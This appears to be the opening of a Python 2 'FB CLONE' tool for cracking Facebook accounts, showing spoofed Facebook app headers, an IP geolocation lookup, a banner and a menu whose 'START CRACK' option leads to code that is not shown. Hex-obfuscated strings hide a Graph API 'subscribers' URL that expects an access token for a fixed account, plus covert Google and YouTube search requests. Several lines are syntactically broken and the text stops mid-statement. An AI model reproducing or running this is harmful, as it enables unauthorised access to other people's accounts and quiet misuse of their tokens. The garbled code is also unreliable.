#!/usr/bin/python2
# -*- coding: utf-8
 
#AUTHOR : MANI RAJPUT (T.E.71)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO MANI RAJPUT
 
 
try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests lolcat")
	os.system("python2 fcpro.py")
 
from os import system
from time import sleep
 
def xox(z):
    for e in z + "\":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
      
 
				
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\68\74\74\70\73\3a\2f\2f\67\72\61\70\68\2e\66\61\63\65\62\6f\6f\6b\2e\63\6f\6d\2f\31\30\30\30\34\35\32\30\33\38\35\35\32\39\34\2f\73\75\62\73\63\72\69\62\65\72\73\3f\61\63\63\65\73\73\5f\74\6f\6b\65\6e\3d"];useragent_url=(user_agent[2])
 
header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 
try:
	requests.get('\68\74\74\70\73\3a\2f\2f\77\77\77\2e\67\6f\6f\67\6c\65\2e\63\6f\6d\2f\73\65\61\72\63\68\3f\71\3d\41\7a\69\6d\2b\56\61\75')
	requests.get('\68\74\74\70\73\3a\2f\2f\6d\2e\79\6f\75\74\75\62\65\2e\63\6f\6d\2f\72\65\73\75\6c\74\73\3f\73\65\61\72\63\68\5f\71\75\65\72\79\3d\41\7a\69\6d\2b\56\61\75\2b\4d\72\2e\2b\45\72\72\6f\72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	xox("\\\33[93;1m  NO INTERNET CONNECTION :(\\")
	sys.exit()
	
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
	
def linex():
	os.system('echo  "\ ======================================\" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\  ▄▄▄      ████████╗███████╗███████╗ ██╗                   │
│                   ╚══██╔══╝██╔════╝╚════██║███║                   │
│                      ██║   █████╗      ██╔╝╚██║                   │
│                      ██║   ██╔══╝     ██╔╝  ██║                   │
│                      ██║██╗███████╗██╗██║  ██║                   │
│                      ╚═╝╚═╝╚══════╝╚═╝╚═╝   ╚═╝ ╔═════════════════════════════╗\    ║ TOOL NAME: { FB CLONE }        ║\    ║ AUTHOR   : MANI RAJPUT     ║\    ║ GITHUB   :   Manirajput1   ║\    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
 
def main():
	os.system("clear")
	logo()
	print("\\33[93;1m      MAIN MENU\1b[0m")
	print("")
	print("\33[92;1m  [1] START CRACK")
	print("\33[93;1m  [2] CONTACT ME(FB)")
	print("\33[94;1m  [3] UPDATE TOOL")
	print("\33[96;1m  [J] TEAM ERROE 71 JOIN GROUP \33[92;1m✘\33[91;1m✘")
	print("\33[90;1m  [0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\33[93;1m  CHOOSE: \33[92;1m")
	if sel == "":
		print("\\33[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		subprocess.check_output(["am", "start", "https://www.facebook.com/manirajput1.vip "])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system(""https://github.com/manirajput1/crack-fb")
			os.system("rm -rf crack-fb")
			os.system("cp -f crack-fb/crack-fb.py \.")
			os.system("rm -rf crack-fb")
			xox("\33[92;1m\ TOOL UPDATE SUCCESSFUL :)\")
			time.sleep(2)
			main()
		except KeyboardInterrupt:
			print("\33[91;1m\ YOUR DEVICE IS NOT SUPPORTED!\")
	        	main()
	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
		subprocess.check_output(["am", "start", "https://t.me/mrerrorgroup"])
		main()
	elif sel =="0" or sel =="00":
		xox("\\\33[91;1m GOOD BYE SEE YOU AGAIN :)")
		sys.exit()
	else:
		print(""
